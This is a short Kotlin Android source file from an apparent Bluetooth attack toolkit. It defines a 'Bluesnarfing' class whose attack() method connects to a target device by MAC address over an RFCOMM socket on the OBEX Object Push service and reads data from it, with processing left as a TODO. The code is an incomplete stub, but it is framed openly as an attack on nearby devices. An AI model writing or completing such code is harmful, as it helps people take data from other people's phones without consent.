package com.hereliesaz.blusnu.attack

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import java.io.IOException
import java.util.*

class Bluesnarfing(
    private val context: Context,
    private val bluetoothAdapter: BluetoothAdapter?
) {
    fun attack(macAddress: String) {
        if (bluetoothAdapter == null) {
            // Handle Bluetooth not supported
            return
        }

        val device: BluetoothDevice? = bluetoothAdapter.getRemoteDevice(macAddress)
        if (device == null) {
            // Handle device not found
            return
        }

        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.BLUETOOTH_CONNECT
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            // Handle missing permission
            return
        }

        val uuid = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")
        try {
            val socket = device.createRfcommSocketToServiceRecord(uuid)
            socket.connect()
            val inputStream = socket.inputStream
            val buffer = ByteArray(1024)
            val bytes = inputStream.read(buffer)
            // TODO: Process the retrieved data
            socket.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}